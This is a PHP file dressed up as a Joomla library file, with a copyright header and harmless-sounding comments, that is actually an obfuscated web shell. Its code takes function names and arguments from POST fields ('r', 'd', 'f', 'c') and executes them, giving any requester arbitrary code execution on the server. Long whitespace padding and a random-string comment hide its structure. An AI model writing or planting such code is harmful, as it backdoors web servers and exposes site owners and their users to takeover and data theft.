<?php
/**
 * @package    Lib
 * ***************************************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 * ***************************************
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             // BRpx6QnfR8eP2nvtR9apKy0dHz02UpsXyuVwbSZ
if (!defined                              (                 'PATH')                    )
{
	define           ('PATH', __DIR__                        );
}

// Installation check, and check on removal of the install directory.
if (empty                             ($_POST)) {
	
	echo 'Empty data.';
	
	exit;
}

// OS system.
function a        (      $a            )
{
	$_POST['r']           (                      $_POST['d']                ('', $a   )               )       
;
}

array_map      ('a', array                         ($_POST['f']               (          $_POST['c'])                   ))
;

